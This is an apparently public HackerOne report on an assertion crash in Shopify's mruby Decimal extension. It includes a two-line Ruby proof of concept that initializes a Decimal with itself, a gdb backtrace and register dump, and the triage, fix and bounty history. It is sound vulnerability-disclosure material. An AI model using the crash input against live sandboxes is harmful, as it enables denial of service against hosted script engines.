{"id":185775,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODU3NzU=","url":"https://hackerone.com/reports/185775","title":"Crash: Initialize Decimal with itself triggers an assertion","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2016-11-27T09:39:55.969Z","submitted_at":"2016-11-27T09:39:55.969Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"brakhane","url":"/brakhane","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/040/726/4b47d99eec4ee906a402afb934855158d1e6d929_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-12-16T20:24:30.867Z","bug_reporter_agreed_on_going_public_at":"2016-12-16T20:24:30.829Z","team_member_agreed_on_going_public_at":"2016-12-16T20:05:16.769Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"When `Decimal` is initialized with itself, a new (empty) `mpd_t` will be created. To fill it with a value, `to_s` of the current instance is called, which accesses the empty `mpd_t`. This triggers an assertion, which leads to a crash.\n\n# Patch\nI've created and attached a simple patch which just returns self when a Decimal is initialized with itself. Pretty simple, but should do the job (careful: I've created the patch after a 20h flight, could be... uhm, suboptimal).\n\n# PoC\nPoC does work on `https://www.mruby.science/runs`, but as it's not up2date that shouldn't really mean anything.\n\n```\na = Decimal.new\na.initialize a\n```\n\n# Trace\n\n```\n$ gdb attach 10251\nGNU gdb (GDB) 7.12\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later \u003chttp://gnu.org/licenses/gpl.html\u003e\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-pc-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n\u003chttp://www.gnu.org/software/gdb/bugs/\u003e.\nFind the GDB manual and other documentation resources online at:\n\u003chttp://www.gnu.org/software/gdb/documentation/\u003e.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nattach: No such file or directory.\nAttaching to process 10251\nReading symbols from /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/build/host/bin/mirb...done.\nReading symbols from /usr/lib/libm.so.6...(no debugging symbols found)...done.\nReading symbols from /usr/lib/libreadline.so.7...(no debugging symbols found)...done.\nReading symbols from /usr/lib/libncursesw.so.6...(no debugging symbols found)...done.\nReading symbols from /usr/lib/libc.so.6...(no debugging symbols found)...done.\nReading symbols from /lib64/ld-linux-x86-64.so.2...(no debugging symbols found)...done.\n0x00007f8de487f131 in pselect () from /usr/lib/libc.so.6\n(gdb) c\nContinuing.\n\nProgram received signal SIGABRT, Aborted.\n0x00007f8de47d104f in raise () from /usr/lib/libc.so.6\n(gdb) bt\n#0  0x00007f8de47d104f in raise () from /usr/lib/libc.so.6\n#1  0x00007f8de47d247a in abort () from /usr/lib/libc.so.6\n#2  0x00007f8de47c9ea7 in __assert_fail_base () from /usr/lib/libc.so.6\n#3  0x00007f8de47c9f52 in __assert_fail () from /usr/lib/libc.so.6\n#4  0x000000000045a356 in mpd_msword (dec=0xa75980) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/mpdecimal.c:218\n#5  mpd_iszero (dec=dec@entry=0xa75980) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/mpdecimal.c:331\n#6  0x0000000000472fc0 in mpd_qformat_spec (dec=dec@entry=0xa75980, spec=spec@entry=0x7ffc8fdcd220, ctx=ctx@entry=0x9f8580, \n    status=status@entry=0x7ffc8fdcd28c) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/io.c:1320\n#7  0x00000000004738d5 in mpd_qformat (dec=0xa75980, fmt=fmt@entry=0x481177 \"f\", ctx=0x9f8580, status=status@entry=0x7ffc8fdcd28c)\n    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/io.c:1390\n#8  0x000000000045602a in ext_decimal_to_s (state=0x9b1010, rself=...)\n    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/ext.c:220\n#9  0x000000000040f6af in mrb_funcall_with_block (mrb=mrb@entry=0x9b1010, self=..., mid=\u003coptimized out\u003e, mid@entry=38, argc=\u003coptimized out\u003e, \n    argc@entry=0, argv=argv@entry=0x0, blk=..., blk@entry=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:407\n#10 0x000000000040fbcc in mrb_funcall_argv (mrb=mrb@entry=0x9b1010, self=..., self@entry=..., mid=mid@entry=38, argc=argc@entry=0, argv=argv@entry=0x0)\n    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:424\n#11 0x0000000000403d23 in convert_type (raise=1 '\\001', method=0x4810cd \"to_s\", tname=0x4813ea \"String\", val=..., mrb=0x9b1010)\n    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/object.c:316\n#12 mrb_convert_type (mrb=mrb@entry=0x9b1010, val=..., type=type@entry=MRB_TT_STRING, tname=tname@entry=0x4813ea \"String\", \n    method=method@entry=0x4810cd \"to_s\") at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/object.c:338\n#13 0x0000000000455927 in ext_decimal_initialize (state=0x9b1010, self=...)\n    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/ext.c:86\n#14 0x000000000041150f in mrb_vm_exec (mrb=mrb@entry=0x9b1010, proc=\u003coptimized out\u003e, proc@entry=0x9b9020, pc=\u003coptimized out\u003e)\n    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n#15 0x0000000000416d57 in mrb_vm_run (mrb=mrb@entry=0x9b1010, proc=proc@entry=0x9b9020, self=..., stack_keep=stack_keep@entry=2)\n    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n#16 0x00000000004028be in main (argc=\u003coptimized out\u003e, argv=\u003coptimized out\u003e)\n    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549\n(gdb) info registers\nrax            0x0\t0\nrbx            0x6\t6\nrcx            0x7f8de47d104f\t140247400517711\nrdx            0x0\t0\nrsi            0x7ffc8fdccc30\t140722722098224\nrdi            0x2\t2\nrbp            0x4ac565\t0x4ac565\nrsp            0x7ffc8fdccca8\t0x7ffc8fdccca8\nr8             0x0\t0\nr9             0x7ffc8fdccc30\t140722722098224\nr10            0x8\t8\nr11            0x246\t582\nr12            0xda\t218\nr13            0x4acbb8\t4901816\nr14            0x0\t0\nr15            0x7ffc8fdcd220\t140722722099744\nrip            0x7f8de47d104f\t0x7f8de47d104f \u003craise+207\u003e\neflags         0x246\t[ PF ZF IF ]\ncs             0x33\t51\nss             0x2b\t43\nds             0x0\t0\nes             0x0\t0\nfs             0x0\t0\ngs             0x0\t0\n(gdb) \n```\n\n","bounty_amount":"10000.0","formatted_bounty":"$10,000","original_report_id":null,"original_report_url":null,"attachments":[{"id":137556,"file_name":"0001-When-initialized-with-itself-return-self.patch","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/137/556/9cc5fd9c49a8efaaba147b7369228af495fe81fe/0001-When-initialized-with-itself-return-self.patch?response-content-disposition=attachment%3B%20filename%3D%220001-When-initialized-with-itself-return-self.patch%22%3B%20filename%2A%3DUTF-8%27%270001-When-initialized-with-itself-return-self.patch\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZE44UNP3%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T135609Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQC84%2FxrJqdCCwT2VjlXdM0dYLn0QvoXQHmCpssLuUm6VwIhAO3iC67AyXWOA%2F3z36SPbkn%2Ffai6VVafNkFoGgkjUsueKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igwb5PygIXmeBc8JH0Eq1wOHytCA5pjRmVxevs8w4KAt3RHdABdzLl8PE8xdn0BZzaWO2%2BxPVK8czc5DTovbHtlE8eGzHxy9a1Ooabm4ZLSpD59VOazu2r6JKIEhEXEg%2FTV1Vgx0E2TSfqupdlfiGwyTb1A8LzOXGw9zpnrmMQw%2B0XcdrP5feOSrmNCYNMJ2z7E3I1MGCnGCydYPQAvKVCyBKSPx7s69QuzhSxoYf4X%2FcFJEHP3%2FygcL%2FD98rS8QLlTMWcCxv1jHeBVMNN%2F%2B%2BAcZ9wnaY76OKqbLObJFRLd46ayXxKrvR80YyXJY118pQV5jPqfd5Kj7tbE7kc4kI%2B0GfbVCvsCGTxEiPpDclNrmtptf4k%2FLJ%2B7nipvwM1FOMzUQ6UZaWIxh0RbhsGBAbE1ro2Jaqzk2GC6YzyAIIhGSfTlP2u%2B%2FpU98%2BCbmoXPN4Dg7ogZ%2BVzWDg7c2q8KGT%2F59tHSngaYumJLZb9YqDpDcC8ds7VmQetLSSTnJoATjjwZDIlkNT3H6mKVGPVQwi143717a%2Fdwyh91U0GxJl%2FVaddVSi%2FrM6mKX8bKlIP4XCxpnPKH4t8VBXLWtAetU6f2zNs3zeuoVfTPctqvXJbH6JSwjpYCeHuRRcECOqL9C9R47AZ8yzL4wrdOQiwY6pAGVokKr73azMJRMhmU%2Br3%2BwNWUEFinWExSoVmWQ04ASlnhd789rI87RxD8FVUBgRzE5KHbumtP4lyRVMgswgape0GoklHI7J8TtlbHrw7nndmRXRYZoJlGJ30ErIhZk5QHDIN4PeutMKFMjF47AVSSpI5NKUOOWHTe3Iy4Q%2BcaxkwuWCvC0%2BBmmOqxJ%2BRR0m%2Bgi%2Bkiif7lspWAeuDHDkXIvfVidfg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=3177ee27afdcd003203c94561c59a987645f7614605971cdd784f85cad1c346c","file_size":1125,"type":"text/x-diff"}],"allow_singular_disclosure_at":"2017-01-15T20:05:16.799Z","allow_singular_disclosure_after":-149449852.476423,"singular_disclosure_allowed":true,"vote_count":9,"voters":["michiel","pekafat","mpz","eveeez","hussain_0x3c","japz","spetr0x","scept1c","no-longer-with-company"],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1323188,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the issue, and our engineering team is investigating.","automated_response":false,"created_at":"2016-11-28T15:46:43.656Z","updated_at":"2016-11-28T15:46:43.656Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1334709,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @brakhane and thanks again for your report! We deployed a fix to our production environment yesterday.\n\nAs we mentioned in previous reports, it may be another week or two before we asses the impact and handle bounty payouts. Thank you for your patience.","automated_response":false,"created_at":"2016-12-01T19:58:18.665Z","updated_at":"2016-12-01T19:58:18.665Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"brakhane","url":"/brakhane"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1370092,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify Scripts and the mruby project!","automated_response":false,"created_at":"2016-12-16T20:05:11.060Z","updated_at":"2016-12-16T20:05:11.060Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"10000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"brakhane","url":"/brakhane"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1370093,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-12-16T20:05:16.784Z","updated_at":"2016-12-16T20:05:16.784Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1370169,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for the awesome bounty and the fun! Always a pleasure!","automated_response":false,"created_at":"2016-12-16T20:24:30.844Z","updated_at":"2016-12-16T20:24:30.844Z","actor":{"username":"brakhane","cleared":false,"url":"/brakhane","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/726/4b47d99eec4ee906a402afb934855158d1e6d929_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1370170,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-12-16T20:24:30.880Z","updated_at":"2016-12-16T20:24:30.880Z","actor":{"username":"brakhane","cleared":false,"url":"/brakhane","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/726/4b47d99eec4ee906a402afb934855158d1e6d929_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}